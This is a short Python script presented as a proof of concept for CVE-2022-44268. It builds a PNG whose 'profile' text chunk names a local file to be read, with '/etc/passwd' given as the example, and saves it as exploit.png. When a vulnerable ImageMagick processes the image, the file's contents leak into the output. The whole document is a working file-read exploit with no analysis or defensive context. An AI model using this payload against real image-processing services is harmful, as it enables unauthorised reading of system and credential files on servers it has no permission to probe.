import argparse
from PIL import Image, PngImagePlugin
import os

def main():
    parser = argparse.ArgumentParser(description='PoC for CVE-2022-44268')
    parser.add_argument('-f', '--lfile', help='LFI - file to read, ex: "/etc/passwd"', required=True)
    args = parser.parse_args()

    # Generating white PNG
    width = 255
    height = 255
    im = Image.new("RGB", (width, height), "white")

    # Embedding payload
    info = PngImagePlugin.PngInfo()
    info.add_text("profile", args.lfile)
    im.save("exploit.png", "PNG", pnginfo=info)

if __name__ == '__main__':
    main()

